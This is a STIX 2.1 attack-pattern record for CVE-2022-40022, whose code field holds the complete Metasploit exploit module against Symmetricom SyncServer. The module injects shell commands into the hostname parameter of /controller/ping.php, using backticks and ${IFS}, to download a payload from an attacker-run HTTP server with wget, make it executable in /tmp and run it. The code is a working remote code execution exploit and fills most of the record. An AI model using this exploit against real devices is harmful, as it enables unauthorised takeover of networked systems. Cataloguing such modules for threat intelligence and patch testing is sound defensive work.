{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--1a7a84a5-f3d2-42e5-8d30-8cec976748d3",
    "created": "2024-08-14T17:02:01.841723Z",
    "modified": "2024-08-14T17:02:01.841728Z",
    "name": "Symmetricom SyncServer Unauthenticated Remote Command Execution",
    "description": " This module exploits an unauthenticated command injection vulnerability in /controller/ping.php. The S100 through S350 (End of Life) models should be vulnerable to unauthenticated exploitation due to a session handling vulnerability. Later models require authentication which is not provided in this module because we can't test it.",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/http/symmetricom_syncserver_rce.rb",
            "external_id": "symmetricom_syncserver_rce.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2022-40022"
        },
        {
            "source_name": "reference",
            "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-40022"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::EXE\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::Remote::HttpServer::HTML\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Symmetricom SyncServer Unauthenticated Remote Command Execution',\n        'Description' => %q{\n          This module exploits an unauthenticated command injection vulnerability in /controller/ping.php.\n          The S100 through S350 (End of Life) models should be vulnerable to\n          unauthenticated exploitation due to a session handling vulnerability.\n          Later models require authentication which is not provided in this module because we can't test it.\n          The command injection vulnerability is patched in the S650 v2.2 (CVE-2022-40022).\n          Run 'check' first to determine if vulnerable.\n          The server limits outbound ports. Ports 25 and 80 TCP were successfully used for SRVPORT\n          and LPORT while testing this module.\n        },\n        'Author' => [\n          'Steve Campbell', # @lpha3ch0 - Exploit PoC, Metasploit module\n          'Justin Fatuch Apt4hax', # Exploit PoC\n          'Robert Bronstein' # Metasploit Module\n        ],\n        'References' => [\n          ['CVE', '2022-40022'],\n          ['URL', 'https://nvd.nist.gov/vuln/detail/CVE-2022-40022']\n        ],\n        'DisclosureDate' => '2022-08-31',\n        'License' => MSF_LICENSE,\n        'Platform' => 'linux',\n        'Arch' => [ARCH_X86, ARCH_X64],\n        'Targets' => [\n          [ 'Automatic', {} ],\n        ],\n        'DefaultTarget' => 0,\n        'Notes' => {\n          'Stability' => [ CRASH_SAFE ],\n          'Reliability' => [ REPEATABLE_SESSION ],\n          'SideEffects' => [ ARTIFACTS_ON_DISK, IOC_IN_LOGS ]\n        }\n      )\n    )\n    register_options(\n      [\n        OptString.new('FILENAME', [true, 'Payload filename', 'payload.elf']),\n        OptAddress.new('SRVHOST', [true, 'HTTP Server Bind Address', '127.0.1.1']),\n        OptInt.new('SRVPORT', [true, 'HTTP Server Port', '4444'])\n      ], self.class\n    )\n  end\n\n  def primer; end\n\n  def on_request_uri(cli, req)\n    @pl = generate_payload_exe\n    print_status(\"#{peer} - Payload request received: #{req.uri}\")\n    send_response(cli, @pl)\n  end\n\n  def check\n    uri = '/controller/ping.php'\n    res = send_request_cgi({\n      'method' => 'POST',\n      'uri' => uri,\n      'vars_post' =>\n          {\n            'currentTab' => 'ping',\n            'refreshMode' => 'dirty',\n            'ethDirty' => 'false',\n            'snmpCfgDirty' => 'false',\n            'snmpTrapDirty' => 'false',\n            'pingDirty' => 'true',\n            'hostname' => \"\\`id\\`\",\n            'port' => 'eth0',\n            'pingType' => 'ping'\n          }\n    })\n    if res && res.body.to_s =~ /uid=0/\n      Exploit::CheckCode::Vulnerable\n    else\n      Exploit::CheckCode::Safe\n    end\n  end\n\n  def request(cmd)\n    uri = '/controller/ping.php'\n    send_request_cgi({\n      'method' => 'POST',\n      'Content-Type' => 'application/x-www-form-encoded',\n      'uri' => uri,\n      'vars_post' =>\n      {\n        'currentTab' => 'ping',\n        'refreshMode' => 'dirty',\n        'ethDirty' => 'false',\n        'snmpCfgDirty' => 'false',\n        'snmpTrapDirty' => 'false',\n        'pingDirty' => 'true',\n        'hostname' => cmd,\n        'port' => 'eth0',\n        'pingType' => 'ping'\n      }\n    })\n  end\n\n  def exploit\n    srvhost = datastore['SRVHOST']\n    srvport = datastore['SRVPORT']\n    filename = datastore['FILENAME']\n    resource_uri = '/' + filename\n    shell_path = '/tmp/'\n    cmds = [\n      \"\\`wget${IFS}http://\" + srvhost + ':' + srvport + '/' + filename + '${IFS}-O${IFS}' + shell_path + filename + \"\\`\",\n      \"\\`chmod${IFS}700${IFS}\" + shell_path + filename + \"\\`\",\n      \"\\`\" + shell_path + filename + \"\\`\"\n    ]\n    start_service({\n      'Uri' => {\n        'Proc' => proc { |cli, req|\n                    on_request_uri(cli, req)\n                  },\n        'Path' => resource_uri\n      }\n    })\n    print_status(\"#{rhost}:#{rport} - Exploit started...\")\n    print_status(\"#{rhost}:#{rport} - Sending wget command...\")\n    request(cmds[0])\n    sleep(3)\n    print_status(\"#{rhost}:#{rport} - Making payload executable...\")\n    request(cmds[1])\n    sleep(3)\n    print_status(\"#{rhost}:#{rport} - Executing payload...\")\n    request(cmds[2])\n    sleep(3)\n  end\nend\n",
    "x_mitre_contributors": [
        ""
    ],
    "x_mitre_disclosure_date": "2022-08-31",
    "x_mitre_platforms": [
        "linux'"
    ]
}